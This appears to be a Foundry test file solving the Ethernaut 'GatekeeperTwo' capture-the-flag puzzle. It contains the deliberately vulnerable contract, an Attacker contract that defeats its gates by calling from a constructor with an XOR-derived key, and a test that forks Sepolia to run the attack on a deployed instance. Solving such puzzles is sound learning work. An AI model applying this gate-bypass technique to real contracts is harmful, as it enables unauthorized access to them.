// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract Attacker {
    constructor(GatekeeperTwo gatekeeper){
        uint256 key = uint256(uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        uint256 mask =  type(uint256).max;
        key = key ^ mask;

        bytes8 result = bytes8(uint64(key));

        gatekeeper.enter(result);
    }
}

contract GatekeeperTest is Test{
    function setUp() public {
        vm.createSelectFork("sepolia");
    }

    function test_gatekeeper2_attack() public{
        GatekeeperTwo gatekeeper = GatekeeperTwo(0x3A0FC9af6C3C329B19663a8D80705C0087159961);
        Attacker attacker = new Attacker(gatekeeper);
        require(tx.origin == gatekeeper.entrant(), "Attack failed");
    }
}
